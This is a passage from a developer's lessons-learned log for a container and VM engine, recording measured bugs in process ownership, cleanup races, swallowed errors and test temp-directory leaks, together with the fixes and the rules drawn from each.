- **`undefine --snapshots-metadata` does not delete the snapshot** — it only deletes what points to it.
  The state stayed in the qcow2 (`qemu-img snapshot -l` showed it) while `vm snapshots`
  answered empty list with rc=0 and `vm restore` said «does not exist». Corollary of the same
  finding: **an empty list with rc=0 is not «there is none»** — it may be «I asked the wrong place»,
  and here the wrong place was libvirt, which only knows about defined domains (v0.51.x);
- **a connection cut halfway is not a lost download**, and **the `Content-Length` of a 206 is not
  the blob's size** (it is the FRAGMENT's) — see the «The pull of a blob restarted from zero»
  section below (v0.51.0+);
- **a `read` that FAILS is not an empty reply** — the control socket's client did
  `let _ = s.read_to_string(&mut resp)`, discarding the error, so a read timeout and a
  holder answering nothing were indistinguishable: both gave ``system call `ingress control`
  failed:`` **with nothing after the colon**. And the ceiling was 5s while `handle_control` is THE
  serialization point — a queued caller waits for every attach ahead of it. Measured,
  and it scales with concurrency (not host noise): 10 concurrent attaches → 0 failures, 20 → 3,
  30 → **15**. With the error read and the ceiling at 30s: **30/30 in 21s**. It is recorded because my
  first reading was «the server closes mute» and it was WRONG — the server closed nothing, it was
  we who gave up (v0.47.0). **The pattern sweep that followed found two more `let _ =`
  over a `read`, and one of them was worse**: `slirp_add_hostfwd` had a 500 ms ceiling on the SINGLE
  slirp that all ingress shares, and after the read it did `if resp.contains("\"error\"")`
  → else `Ok(())`. A timeout leaves `resp` empty, an empty string does not contain `"error"`, and
  the function returned **SUCCESS** for a publish that may never have happened. There the symptom was an
  error with no subject; here it was a false success. `slirp_api` (the other) returned `Ok("")`, which
  `slirp_remove_hostfwd` parses as JSON `Null` and concludes there is nothing to remove — an
  unpublish reporting success without having removed anything, with the host port stuck;
- **«not in the container store» is not «not local»** — the `image scan` of a VM image
  announced «not local», went to Docker Hub to fetch `library/<name>` and died in a **401**. It now
  refuses with the name of the alternative; walking a guest's filesystem is another
  SBOM path, and a scan that silently does nothing useful is the failure the command exists
  to avoid (v0.47.0);
- **a VM image name is not a disk path** — and `kind: Vm` treated it as if it were.
  `resolve_vm_disk` returned `spec.disk` RAW while `vm create` consulted the
  `VmImageStore`, so the SAME string worked as `--disk` and answered
  `image not found` as `spec.disk`. See the «The VM manifest resolved the image a
  different way than the CLI» section below — the resolution divergence is the root, the visible error was the
  lesser of the two symptoms;
- **a `-` presence marker is not «absent»** — `stack wait` decided readiness with
  `present == "yes" && ready_status(...)`, and the declarative Kinds (`Ingress`/`FirewallPolicy`/
  `HTTPRoute`/`Dependency`) have no store at all: `presence` returns `-` for them and **never**
  `"yes"`. So ANY manifest with one of them exhausted the whole `--timeout` and exited with an error
  about a stack that was entirely running — the command written to replace CI's `sleep` being
  precisely what CI could not use. Measured before the fix, with the two roots
  isolated: **5.015 s and rc=1** over a manifest that declares not a single stateful resource.
  The neighbouring `ready_status` already had the right intent in its doc-comment («Only the Kinds that HAVE a
  runtime state are judged on it»); what was missing was the upstream decision distinguishing «absent» from «no
  observable presence», and that is what `is_pending` (pure) now does. **The `?` stays
  pending on purpose**: it is also what an unreadable store returns, and giving «ready» to an
  unknown is the same defect in reverse — so the missing Kind was fixed in
  `presence` and not by relaxing `is_pending`. Along the way, the twin finding: **`NetworkRoute` was
  in `KINDS` and was APPLIED by `stack apply` with no arm in `presence`**, so it fell into the
  `_ => ("?", "unsupported kind")` — `stack ls`/`describe` calling «unsupported kind» on
  a resource that apply creates. **And `stack wait` had ZERO checks in `scripts/e2e.sh`** — the
  bucket of «commands never executed» paying out again, and it is where the next sweep should
  go first (v0.53.0);
- **`argv[0]` saying `slirp4netns` is not «this slirp is ours»** — `slirp4netns` is not ours, it is
  a third-party tool that rootless Podman also uses, with the SAME argv shape
  (`… <target-pid> tap0`). `list_slirps` identified by `argv[0]` and nothing else, so
  `reap_orphan_slirp` treated as a REAPABLE orphan any slirp on the host whose target had
  died — including those of other tools. And it runs from `publish_with_retry`, that
  is, whenever OUR `-p` fails: a port conflict here would send SIGTERM to the network of an
  entirely unrelated engine, on the same machine. Reproduced live (2026-08-15) with a slirp
  started by hand with Podman's argv shape: marked for reaping, while the four real slirps
  of delonix were correctly spared. The ownership token is `--api-socket`, because it is the
  only argv element whose PATH we choose; one of our slirps without ports has no
  api-socket and answers «not mine», which is the honest answer and costs nothing — whoever frees
  a stuck port is `reap_slirp_for`, which knows the target by pid;
- **`run -d` having returned is not the container being mounted** — `spawn` returned right after
  the «GO» of the userns handshake and the init only AFTERWARDS did the `pivot_root` and the volume binds. An
  `exec` in that window ran the HOST's `/bin/sh` and wrote host files, with exit 0
  (measured, 3 in 12). And the twin: **`pid` + `Running` in the record was not the container being mounted**
  — the save happened before the proof, and it is the record that a third party reads. Closed in v0.66.x — see
  «An `exec` right after `run -d` ran on the HOST»;
- **«the process is detached» is not «I no longer need the caller's fds»** — `start_pin` inherited
  the caller's `stderr` with the comment guaranteeing that «inheriting stderr costs nothing (the
  process is detached)». The pin sleeps for the whole life of the infra, so it holds that fd open
  forever: whoever captures the output by pipe is stuck in a `read` that never sees EOF —
  `out=$(delonix …)`, a CI step, a `stack apply` in a pipeline, all hang if it happens
  to be that invocation that starts the network. **Measured on 2026-08-15**: `scripts/e2e.sh` stopped 16
  minutes without writing a check, with bash in `anon_pipe_read` and **not a single live child** — the
  write end of the pipe was fd 2 of `delonix netns pin`. And the fix already existed **two
  functions above**: `start_control` writes to `control.log` with this very reason explained, and
  even named the pin as a counter-example — when the pin is the MOST long-lived of the two (control
  restarts, the pin never). It now goes to `ingress/pin.log`. Same shape as `write_private_temp`: the
  fix done and the neighbouring caller left behind. **Note on method**: a `timeout` in the
  battery would have killed the run explaining nothing; what gave the answer was following the pipe to
  its owner (`readlink /proc/*/fd/*`);
- **a `slirp4netns`'s target having died is not the slirp having exited**, and it is the **third
  occurrence** of «detached is not without the caller's fds». A container's slirp (`-p` without
  its own net) only exits when the kernel tears down the netns: measured 13 s and 17 s on a calm host and
  **over an hour** with the disk saturated (2026-10-01, two of them listening on the published
  port). And it was launched by a `Command::spawn` in the middle of startup, so it inherited the
  simple `pipe()`s that the container's `spawn` has open — `readlink /proc/<slirp>/fd/*`: the
  two ends of the log pipe and the write end of the supervisor's handshake. Three
  consequences, all measured: the log shim never saw EOF and lagged behind after the
  `rm -f`; a container that exited on its own (or long after a `stop` that gave up with
  DX-8101) left the port occupied, because the record loses the pid on exit and the pid was the
  only thing that named the slirp; and the next `container start` **hung forever** —
  the new slirp's `add_hostfwd` was refused, the supervisor said so and exited, and the parent kept
  reading the handshake waiting for an EOF that only the new slirp (left alive by a
  `mem::forget`) could give. Fixed at all four ends: `spawn_holding_only` marks everything
  close-on-exec except the `--ready-fd` (marks, does not close — the `Command` reports a
  failed `exec` through a pipe of its own); the supervisor releases the slirp the instant it reaps the process
  (`Supervision::on_exit`), `reconcile_with_diagnostics` when it notices the death, and the
  pid-less teardown sweeps OUR slirps of a dead target; a refused `add_hostfwd` reaps the
  orphans and retries, and if it fails kills the slirp it launched; and `read_handshake` waits
  on the pipe AND on the supervisor — the supervisor dead, what is in the pipe is all there will be.
  **Rule: whoever launches a process that outlives the caller passes it the descriptors by
  name, and whoever waits for EOF on a pipe also waits for the process that was meant to close it.**
  Gate: `scripts/e2e_slirp_lifecycle.sh` (seven scenarios, in `e2e.sh`) and the tests
  `tests_detached_helper` / `supervise::tests`. **Closed the same day was what had been left
  out**: the pin, the adopted pin and the control plane were also launched with the caller's
  descriptors (only stderr had been fixed on 2026-08-15) — `leave_callers_descriptors`,
  registered BEFORE the `pre_exec` that hands the two synchronization descriptors to the pin,
  because they run in registration order; scenario `infra` (a caller's fd 9 appeared in the
  `netns pin` and the `netns control`). And `container stats` and the listing of kind clusters
  recorded the death without releasing the slirp — both now go through `reconcile_and_persist`, which
  now releases it; test `a_recorded_death_releases_the_containers_own_slirp` (a `sleep` with the
  name `slirp4netns` and the dead pid in place of the target). **«The slirp disappeared» does not prove that anyone released it** — it exits on its own, in less
  than 1 s or in 17 s depending on the binary, even with the netns held by a descriptor (measured). The
  proof is the SIGNAL: the `exit`, `stats` and `kind` scenarios stop the slirp (SIGSTOP) before the
  container exits and read the pending SIGTERM in `/proc/<slirp>/status`. And a `run -d` ALWAYS has a
  supervisor, which records the exit before any command: the `stats` and
  `cluster ls` path is only exercised with the supervisor dead first. Live, 2026-10-02: binary
  with the two releases reverted — `stats` and `kind` FAIL, `exit` FAIL in 4 of 5 (the fifth
  passed because another host `delonix` swept orphans that second: the sweep is by uid,
  not by root); `main` — all three PASS. **Three more, with the same hold-the-exit technique**: `stopgaveup`
  (a `stop` that gives up with DX-8101 releases the port and the slirp at that moment — FAIL in the binary from
  before #646, PASS after; the slirp goes ZOMBIE, does not disappear, because it is a child of the supervisor);
  `hang` (a fake `slirp4netns` on the PATH that only sleeps: `start` must return with the cause); and
  `zombies` — **found while proving**: the slirp and the log shim are children of the supervisor, which only
  reaped the container, and a `--restart always` that always falls added 2 zombies per restart (6
  after 3, measured). The supervisor reaps them between incarnations (`reap_finished_children`;
  test in a process of its own, because `waitpid(-1)` in the test binary would take the children of
  the other tests). A scenario that depends on fast exits answers 77, not PASS, when the
  disk is saturated — `zombies` passed once on a defective binary because the restarts
  did not even happen;
- **a live PID is not the process the pidfile says** — `infra`'s `kill_pidfile` decided by
  `Path::new("/proc/{pid}").exists()`, so a stale pidfile whose number had been
  recycled sent SIGTERM to a stranger's process. `ingress_proxy::running_pid` already had the right
  guard (it compares `/proc/<pid>/cmdline`) and said why in its doc-comment; the path that
  kills the holder, the control and the slirp is the one that went without it. **Note on severity, measured and not
  deduced**: on this host `pid_max` is 4,194,304 with the last PID at ~416,746 — the wraparound
  is ~3.8 million away and is NOT imminent here. The guard is still right (a long-lived
  host wraps, and `pid_max` at 32768 is common on other machines), but whoever prioritizes this
  above the missing `flock` in `ensure`/`teardown` has the order wrong: the guard prevents the collateral
  damage, it does not prevent the wrong decision that causes it. **And the next sweep showed that the
  problem was not the mechanism, it was a forgotten consumer**: `safe_to_signal(pid, starttime)`
  has existed for a long time, with the `starttime` from `/proc/<pid>/stat` distinguishing a recycled pid, and it guards
  SIXTEEN call sites on the container side. The VMs are the ones that were left out — the
  `CloudHypervisorBackend::stop` killed by `pid > 0` (it did not even check `/proc`) and the `Vm` record did not even
  carry the `starttime` to compare. I recorded it first as «mechanism written and never wired», 
  the pattern of `mount_live`/`set_net_rate`/`update_limits`, and it was WRONG: here the mechanism is
  mature and well used, it lacked a consumer. The three functions moved to
  `delonix-runtime-core`, next to the field they exist to guard, and `delonix-vm` lost its
  THIRD copy of `is_alive` (it read `/proc`, the engine's uses `kill(pid,0)`); `netns holder` is accepted besides
  `netns pin` on purpose — `teardown` is the recovery command of an in-place upgrade, and
  the live process there is from a pre-split binary;
- **a process's argv is not proof that it is OURS** — and this one appeared THREE times in
  different crates before anyone named it. Every `DELONIX_ROOT` of the same uid runs
  processes with identical argv, so asking «is this a process of the right TYPE» never
  answers «is this process MINE». The three: `delonix-sdn`'s `read_pid_verified` validated the pin
  and the slirp by argv (ACH-016, #273 — there were FIVE live pins on this host, from five roots); the
  `running_pid` of `ingress_proxy` looked for `ingress-proxy` in the cmdline (ACH-017, #274); and the
  `is_alive` of `cmd/tunnel.rs` asked whether the cmdline CONTAINED `"ssh"` (ACH-018, #275).
  The two halves hurt in opposite ways, and the second is the worse for making no noise: the
  WRITE kills another's process (the pid goes to `SIGTERM`, and a `SIGHUP` by default also
  terminates); the READ takes the other's resource for ours, returns `rc=0` and **does not do the work** — the
  proxy's `apply` said «serving» without serving, and the tunnel's took it for already running without
  starting it.
  **Each process proves it with what it HAS, and measures before deciding**: the pin and the control carry
  `DELONIX_ROOT` pinned by us; `slirp4netns` carries NOT ONE `DELONIX_*` variable (it is not our
  binary) and the token is the `--api-socket` we choose; the L7 proxy is `--config`; and the agent
  of a tunnel had no token at all — the answer there was **pinning the variable at spawn**, which is
  ours, instead of hunting for a token that did not exist. A token in the argv only serves if it is a path
  that WE derive from the root.
  **A substring of the blob is not an argument**: the tunnel's guard matched `/usr/bin/ssh-agent`,
  two `ssh: … [mux]` of Ansible, the `gcr-ssh-agent` and a `bash` that spelled `ssh` inside a
  path — four live processes and an accidental fifth, none of them a tunnel. You compare the
  **filename of `argv[0]`**, and additionally require an element that carries OUR port
  or OUR path.
  **Tolerance is written, never assumed**: a process from a binary older than the fix does not
  carry the variable we now require, and requiring it makes recovery a silent no-op — the
  `rm` reports success without signalling anything, and the orphan stays forever. We tolerate ABSENCE,
  never a value that names another root.
  **And it was the PATTERN sweep that found the third** — no per-subsystem finder had
  `cmd/tunnel.rs` on its surface. It is the same lesson that audit #3 had already left written
  for `bpf.rs`;
- **a delivered SIGKILL is not a dead process** — and it is the **second occurrence** of the same
  trap in the container lifecycle. First was `stop` (2026-09-17: a pod member in
  `D` 1.5–6.8 s after the SIGKILL let the next `start` run a second incarnation alongside the one
  that was dying; fixed with `process_gone` and a bounded wait). `remove` was left
  out, and on 2026-09-27, with load ~111, `delete pod --force` reported success and `container ps
  -a` stopped listing the members while the five workloads (`sleep 300`, PID 1 of their pidns),
  the `netns run` supervisors and the log shims (already zombies) stayed on the host after the chaos
  deleted the sandbox. **The initial hypothesis, «the recorded pid is the intermediate `delonix`», was
  wrong, and it was measured before touching anything**: the recorded pid is the workload (`NSpid <host> 1`) and the
  signal reaches it. What takes time is the EXIT: PID 1 tears down its mount namespace, and the overlay
  flushes the upper to disk on exit (`wchan = wb_wait_for_completion`, state `D`). On
  960c7bc6, with a writer on the same fs, `delete pod rp --force` returned in 0.76 s and the
  processes exited 14.9 s later (20 s in another run, 0.4 s with the disk calm). Meanwhile the
  `rm` had already purged the directory that the overlay was still flushing, and the `delete pod` had unplugged
  the netns from under it. **Rule: every path that signals and then does something that presumes the
  process dead (deleting the record, the cgroup or the rootfs, unplugging the netns, starting the next
  incarnation) waits for `process_gone` — now `wait_until_gone`, shared — and, if the deadline
  expires, says so and keeps the record** (`DX-8101 container.still_exiting`). Waiting for PID 1
  covers the whole pidns: the kernel kills and reaps its other processes before PID 1 becomes a
  zombie. **Third occurrence, closed on 2026-09-28**: the five `kill → return Err` of the `spawn`
  between the `clone` and the registration (userns maps, `setup_cgroup`, `on_started` hook, on both
  paths). The case was wider than the sweep said: the path WITHOUT userns (root only, not
  measured) removed the cgroup with the process still in it, but the path WITH userns — the normal
  one in rootless — did not even remove it, and the record is never written, so nobody found the
  leaf again. Measured: `run -d -p` with a `slirp4netns` that fails left an EMPTY `dlx-<id>` in 4
  runs of 4. None reaped the child (zombie in a caller that lives). They now pass through
  `discard_child`: SIGKILL, `waitpid`, and only then `remove_container_cgroup` — the order the
  two failure paths at the end of `spawn` already followed. **Gates**: `a_discarded_child_is_reaped_
  not_left_a_zombie` (red without the `waitpid`: the child stays `Z`) and, live, the `e2e.sh`
  check «a refused start after the clone does not leave the container cgroup behind»,
  with a fake `slirp4netns` on the PATH and the id taken from the `create` event (base: leaves
  `dlx-<id>`; fix: 5/5 clean with a continuous writer). The VM paths
  (`terminate_vmm`/`wait_vmm_left`) and `HeldChild` (`kill` + `waitpid`) already waited.
  **Gate** (#562): `remove_tests` in `delonix-linux` — a process that exits 1 s AFTER the signal
  and goes red with the wait reverted (verified). The first version used a simple `sleep`,
  which dies immediately with SIGKILL, and **passed with the wait removed**: for a test
  of «wait for the exit», the subject has to take time to exit. **To reproduce it live, an isolated `dd`
  is not enough** (6 GB finish in 3 s, before the removals, and the old binary passed);
  you need a CONTINUOUS writer on the same fs for the whole run.
  **And keeping the record is not enough: it has to say WHY the process is going to die** (2026-10-02, seen
  twice with the disk saturated): `run -d --restart always` + `rm -f` returned `DX-8101`,
  kept the record as the rule demands — and when the process finally exited the supervisor
  restarted it (`Up`, RESTARTS 1). `stop` marks `stopped_by_user` before signalling; `rm -f`
  marked nothing, and the supervisor read «dead and nobody stopped it». Now `remove_waiting`
  records the intent before the signal (`record_removal_intent`), and a `start` refused with
  «already running» stopped clearing the mark along the way — the process still exiting is
  exactly a container that reads `Running`. The container stays `Stopped` awaiting the `rm` that the
  error asks for; a later `start` brings it back as after any `stop`. **Gates**:
  `a_forced_remove_that_gave_up_is_not_restarted_by_the_supervisor` (the test IS the supervisor: parent
  of the process, the same `wait_and_record` and the same `resume_restart`) and
  `a_refused_start_keeps_the_stop_the_operator_asked_for`, both red with the fix
  reverted (verified). **Whoever gives up halfway leaves written what it had asked for**.
  **Proved live on 2026-10-02, without a saturated disk** (`scripts/e2e_rm_force_gave_up.sh`, in
  `e2e.sh`): a pidns's PID 1 only finishes exiting once all its processes have been reaped
  (`zap_pid_ns_processes`); a `container exec` leaves there a process with the parent OUTSIDE the pidns, and
  with that parent stopped (SIGSTOP) PID 1 stays in state S until the SIGCONT — `rm -f` gives DX-8101
  always. Binary from before #647: resurrected 3 in 3; `main`: 3 in 3 right;
- **leaving `container ps -a` is not leaving the host** — the chaos's `pod_cleanup` (#561) measured the
  records, and the leak above passed it: the records left, the processes stayed. Since #562 it measures
  the PROCESSES of each member, read BEFORE removing it: the recorded pid, the supervisor (the parent,
  which only counts if its `/proc/<pid>/environ` has a `DELONIX_ROOT` under the sandbox) and its
  children (the log shim). It returns rc 3 if any survive. And the end of the run has a
  `sandbox-teardown` verdict: nothing with `DELONIX_ROOT` under the sandbox may stay on the host.
  **Three measured details**:
  - the workload does NOT inherit `DELONIX_ROOT` (its environment is the container's); who denounces it is the
    supervisor, which only exits after reaping it;
  - identify by `environ`, never by name: the host runs another instance of the engine, with the
    same process names;
  - list with `comm`, not with `cmdline`, which comes EMPTY in a process halfway through exiting —
    exactly the case being shown.
  The `sandbox-teardown` caught right away a second class of leak, outside this fix (a live `container
  start <id>`, in state S, born of the `netns down`/`netns up` at the end of the
  `pod_holder_respawn`); it was left in a separate investigation.
  **And the verdict itself raced against the exit** (2026-09-29): it sampled the pids once and
  waited 5 s for them, and `control_restart` gave `FAIL sandbox-teardown — <pid>:S:delonix`
  in one run and PASS in the three following, with the pid already gone seconds later. Measured
  next: the supervisor stays in `do_wait` while the workload is in `D`
  (`wb_wait_for_completion`), 51 s with 1.1 GB `Dirty` on the host and over 134 s with 3.5 GB. Now the
  `sandbox_leftover` re-samples the whole set, gives 20 s to everything and extends to 120 s **only**
  while what remains is provably exiting: zombie, `PF_EXITING` in the `stat`, or a
  supervisor whose children are all exiting. A leak (a live process that is not exiting)
  still fails at 20 s (proved with a `sleep 900` with `DELONIX_ROOT` in the sandbox). On
  failure it prints pid, ppid, state, `wchan`, age, `DELONIX_ROOT`, `cmdline` and the children.
  **And `teardown_quiet` discarded the DX-8101** (2026-09-29): the `rm -f` waits up to 30 s for the
  exit and, if the deadline expires, keeps the record (#562), but the harness ignored the rc and did
  `netns down` and `rm -rf` of the sandbox under the process, taking away the only record from where
  a later `rm -f` would find it. Measured with the tree's binary: a workload in `D`
  (`sync_inodes_sb`, then `wb_wait_for_completion`) over 4 min. Now the sandbox is only
  deleted when `container ps -aq` answers, successfully, empty; up to the 120 s ceiling it repeats
  the `rm -f`, and then keeps the sandbox and the netns, fails the verdict with the `rm -f` error, and
  the next `setup` refuses to start over it (`exit 2`). The scenarios' `rm -f … >/dev/null`
  still ignore the rc: it is the teardown that catches what they leave;
- **not appearing in a sweep by the wrong order is not being right** — the sweep of the
  SIGKILL done in #563 looked for «`kill` and then the cleanup» and reported as open the only place in
  `spawn` that had that shape (the path without userns, which only runs as root). The other four
  did not appear because they cleaned up NOTHING, and they were the worst case: on the path with userns, the normal one in
  rootless, the cgroup stayed forever (measured in #564, 4 runs of 4). **Rule: in a
  sweep of «X and then Y», also list the places that do X and do NOT do Y.** The missing cleanup
  has no order to be wrong in, so it does not appear to whoever looks for the order;
- **a provoked failure is not the failure you want to test** — to exercise the failure path
  of `spawn` AFTER the `clone`, the first attempt was to publish an already-occupied port. The `run`
  returned rc=1, but who refused was the CLI's pre-check, BEFORE the `spawn`: no process or
  cgroup was born, and a gate built this way would pass on the binary with the defect. The trigger
  that passes the pre-checks is the dependency itself failing, with a fake `slirp4netns`
  on the `PATH` that exits with 1 (the `on_started` hook runs after the cgroup exists). **Rule:
  before trusting a failure-path gate, confirm that the failure reached the place you
  want to measure.** The `e2e.sh` gate does it by the `create` event: without it, the `run` failed before the
  `clone` and the check FAILS instead of passing on nothing having been left over;
- **fixing one file is not fixing the sibling copied from it** — the `network_alloc_race.rs`
  (2026-08-14) and the `netdef_naming.rs` were born with the same `raiz()`: one folder per pid in
  `/tmp`, created in a `OnceLock` and never removed. On 2026-08-15 `netdef_naming` started sweeping
  the folders of the dead pids, after 23 leftovers had rendered useless a chaos check that
  counted `/tmp/delonix-net-*`. The neighbour, in the same `tests/` of the same crate, was left out and
  left one folder per run for 44 days (~2400 measures on 2026-09-28, fixed in #567).
  And in the #567 session the sweep was designed ANEW, without going to look at the neighbour's. **Rule: when
  fixing a pattern, look for the PATTERN, not the name, in the rest of the repo** (here
  `temp_dir().join(format!(… process::id()))`) and say how many places are left out. It is the
  second occurrence of the same leak in the same crate;
- **sweeping the leftovers of dead runs is not cleaning up at the end** — the sweep by dead pid
  never catches the run that just exited: `netdef_naming` always leaves ITS folder awaiting
  the next run (measured: 1 after a `cargo test --workspace`). libtest has no hook
  «after all» nor tells a test how many will run (filters and `--test-threads` change
  that), so #567 counts the tests that ARE using the root: the first `lease()` creates it, the
  last `RootLease` to exit deletes it, also on unwind. The sweep is left only for what `Drop`
  does not cover (Ctrl-C, timeout, SIGKILL). Measured: the previous binary took `/tmp` from 2 to 202 in 200
  runs; the new one stayed at 0 → 0 with default threads, with `--test-threads=1` and pinned to one
  CPU (400 runs), with no failures;
- **a green test is not a test that tidied up** — nothing looked at the temp dir after the tests,
  so a leak like this never put anything red. A whole `cargo test --workspace` with an
  empty `TMPDIR` (rc=0, 2026-09-28) left **30 entries on the CI runner and 29 locally**:
  `delonix-oci` 13 (`detect.rs` 12, `overlay.rs` 1), `delonix-runtime-bin` 11 locally and 12 on the
  runner (`vm.rs` 5, `mapped.rs` 4, `vmbackends.rs`/`vmimage.rs` 2, and 1 more from `vmimage.rs` only
  on the runner), `delonix-sdn` 4 (`lib.rs` 2, `infra.rs` 1, `netdef_naming.rs` 1) and
  `delonix-state` 1 (`store.rs`). Some use FIXED names (`dlx-detect-go`), which two runs
  in parallel share. **Gate**: the `test` job now runs with a `TMPDIR` of its own, and
  `scripts/tmp_roots_gate.py` compares what is left there with `scripts/tmp_roots_baseline.json`, with
  ratchet in both directions and names normalized (digits → `N`). With #567 reverted it gives
  `new leak: delonix-net-race-N` (verified); with it, green. The baseline is the runner's;
  a local run is compared with `--list`. **Paid in #572** (2026-09-28): each of these tests
  keeps the folder in a `tempfile::TempDir` (the `netdef_naming` in the lease of #567), and the same
  tree gave 29 → **0** locally and 0 on the runner, rc=0 and 2397 passed in both runs. The baseline
  is `{}`: ANY entry fails. With the `delonix-oci` fix reverted the `cargo test`
  still rc=0 and the gate gives 13 × `new leak` and rc=1 (verified). `main` moved three times
  during the PR (#571, #573, #574), and before the merge the measurement was redone over each new tip;
  with the baseline at zero, a leak from another PR no longer hides in the middle of the debt;
- **skipping a test is not exiting it tidy** — the entry only the runner leaves is from
  `uma_imagem_em_uso_por_uma_vm_e_detectada_pelo_disco` (`vmimage.rs`): it creates the folder, and if there
  is no `qemu-img` it does `return` BEFORE the `remove_dir_all`. On a machine with `qemu-img` clean;
  on the runner, without it, it stays. I had predicted the opposite (that the runner, by skipping the
  userns tests, would leave FEWER), and the gate's first CI disproved it: the other 29 were identical.
  **Rule: every `return` of a test that has already created something is an exit that has to clean up**,
  and so the cleanup goes in a guard with `Drop`, not in a line at the end. It is the rule of #565 («X and
  NOT Y») seen from the tests' side. **Closed in #572**: the `TempDir` covers that `return`.
  It is reproduced locally with a `qemu-img` that FAILS ahead on the `PATH` (the test treats the failure
  as the absence): before it stays `dlx-test-vmsbacked-<pid>`, after nothing. Taking `/usr/bin` off the
  `PATH` does not serve, because it breaks `cargo` itself, which failed without saying anything;
- **a cleanup that fails silently is not a cleanup** — the `extract_layer_handles_readonly_dirs_…`
  (`delonix-oci/src/overlay.rs`, since 2026-09-15) ended with `remove_dir_all(&dir).ok()`, and that
  line failed in ALL runs: `extract_layer` restores the layer's `0555` on the `ro/` after
  putting the children there, and without the write bit on the parent you cannot delete any file in it, not even with
  `rm -rf` (measured: `Permission denied` cleaning the measurement's folder). The `.ok()` turned
  EACCES into success for 13 days. It is the **second occurrence in the same file**: the doc of
  `remove_container_dir` records that a `let _ = remove_dir_all(...)` hid an orphan flat rootfs
  per removed container (39 MiB per `redis:7-alpine`). **Rule: whoever swallows the error of a
  cleanup has to LOOK afterwards** — in the tests `tmp_roots_gate.py` looks, and this test now ends in
  `TempDir::close().unwrap()`; a tree extracted from a layer is made writable before being
  deleted. There remain 64 `remove_dir_all(…).ok()` in `crates/` and `bins/` (2026-09-28), between production code
  and test code; in the tests, the gate catches them on the green path;
- **a rule cited in a comment is not a rule of the repo** — the `mapped.rs` tests (since
  2026-08-17) used `temp_dir()` + pid «because this crate has no `dev-dependencies` and the repo's rule
  is to not add dependencies — not even for tests». That rule is not written in AGENTS.md,
  in `docs/dev/coding-conventions.md` nor in any ADR, and `tempfile` was already a dev-dependency of 7
  of the workspace's crates (the commit and the PR of #572 say 8, by counting the declaration at the root). The
  idiom the comment justified left 4 folders per run. **Rule: before obeying a
  rule cited in a comment, find it written**; if it is not, the comment is a hypothesis of
  whoever wrote it. And when the right rule exists only as practice, write it: #572 left it in
  `coding-conventions.md` §9 («A test removes its temporary directory on every exit»), which before
  cited the `tmp_dir(tag)` without a guard as the observed convention. The old idiom was in 204
  lines of test code; the migration of 2026-09-28 passed 195 of them to `TempDir` (and 2 more that
  `grep` did not see, because they kept the `temp_dir()` in a variable: 197 in total). Of the 9 that stayed, 1
  still creates a folder: the opt-in live test `delonix-vm/tests/provider_live.rs`, which hands the folder
  to a hypervisor that may run with another uid (the `tempdir()` creates it with `0700`) and that cannot be
  validated without that hypervisor. Migrated next (#587), with `0755` on the folder: live libvirt did the
  full cycle before and after, and with a provoked `panic!` after the folder and the disk existed,
  before it stayed `dlx-p4-substitution-spike-<pid>`, after nothing. #587 said that this ran on
  `qemu:///session` and that `qemu:///system` was left unrun — wrong on both counts, see «an
  empty list on the wrong connection is not «nothing was left»». (The `delonix-proxmox` one waited for the
  session that had the file open to merge #579.) The other 8 do not create anything to delete:
  paths that have to be missing, expected paths that production computes, production code and the
  lease of `netdef_naming`. On a green run the battery left 0 before and 0 after (2419
  tests, the same lists); the difference is in the failure: with a provoked `panic!` after the folder
  exists (`store_roundtrip_and_resolve`, `delonix-state`), the base leaves `dlx-sec-<pid>` and the
  migration leaves nothing, with rc=101 in both (verified);
- **two copies of the same repo are not two builds** — the proof above gave first the WRONG
  result: the migrated copy also left `dlx-sec-<pid>`. The log had no `Compiling
  delonix-state`: cargo had run the BASE's binary. The two copies came from `git archive`,
  which puts the commit's date on the files (older than the just-compiled artifact), and
  cargo identifies a workspace member by the path relative to the root, so two different
  folders shared the same `CARGO_TARGET_DIR` as if they were one and «fresh». It happened
  **twice in the same day**, to an agent and to me. **Rule: a before/after has one
  `CARGO_TARGET_DIR` per side, and the log of the measured side has to say `Compiling <crate>`**;
- **a count by `grep` is not a count of places** — #577 wrote «204 places» from
  a `grep` for `temp_dir().join(` after the first `#[cfg(test)]` of each file. Read one
  by one by #581, those 204 lines were 195 migrable and 9 that were not: 3 paths that the test
  wants NONEXISTENT, 2 expected paths that production computes, 2 PRODUCTION lines that came
  after the test module, 1 root with a lease and 1 opt-in live test. Only that last one
  still creates a folder. And `grep` did not see 2 others (`let dir = temp_dir(); dir.join(…)`). The
  first summary of the PR said 205, summing the reports of four agents (one said «6 left»
  and listed 5); the recount in the final tree gave 197. **Rule: a number that goes into the
  documentation is recounted in the final tree with the same instrument, and each line is classified by
  what it DOES (creates? deletes? is production?), not by the text that matches**;
- **the TMPDIR is not `/tmp`** — the `tmp_roots_gate.py` only sees the `TMPDIR` that the `test` job gives it, and
  three test binaries write on purpose in literal `/tmp`, because a Unix socket's `sun_path`
  has 108 bytes and an agent session's `TMPDIR` already exceeds 90: `delonix-cri/tests/
  grpc_status.rs`, `delonix-node-api/tests/grpc_list_providers.rs` and `delonix-linux/tests/
  cgroup_parent.rs`. Measured on 2026-09-28: on the green path, none of the three leaves anything in `/tmp`
  nor in the `TMPDIR`. The `cgroup_parent` deletes the root with a `Drop` guard; the two gRPC ones deleted
  the socket on the LAST line, so a failure left a socket in `/tmp` that the gate did not see —
  provoked next with a `panic!` right after the socket existed: there stayed `/tmp/dlx-grpc-tN.sock`
  and `/tmp/dlx-node-tN.sock`; with `tempdir_in("/tmp")`, zero new entries (one
  `CARGO_TARGET_DIR` per side, `Compiling` of both crates in each log). Of the 161 literal
  `"/tmp/…"` in test code, the other 158 are data that is never created. **Rule: a short
  path for a socket is `tempfile::tempdir_in("/tmp")` (`/tmp/.tmpXXXXXX/x.sock` = 22 bytes),
  short AND guarded, never a literal with the pid.** Gate: the `test` job lists `/tmp` right before
  the `cargo test` and the `tmp_roots_gate.py --dir /tmp --before <listing>` fails any new
  entry (an exact name that was already there does not count; the rest is normalized and judged against the same
  empty baseline). The two censuses also run when a test fails — that is where a
  cleanup on the last line does not run. With the fix reverted and the `panic!`, the gate fails with the
  two sockets;
- **a gate after the tests is not a gate over the tests that failed** — a CI step
  after `cargo test` inherits GitHub's default condition (`if: success()`): if a test
  fails, the step SKIPS. From #569 (13:46Z) to #585 (20:57Z) of 2026-09-28, the `TMPDIR`
  census was a step like this, and it skipped precisely on the run it exists for: the first `test`
  job of #577 (15:16Z) had `cargo test` fail and the gate step `skipped` (measured in the
  job's steps). A test that fails before the last line is when a cleanup on the last line
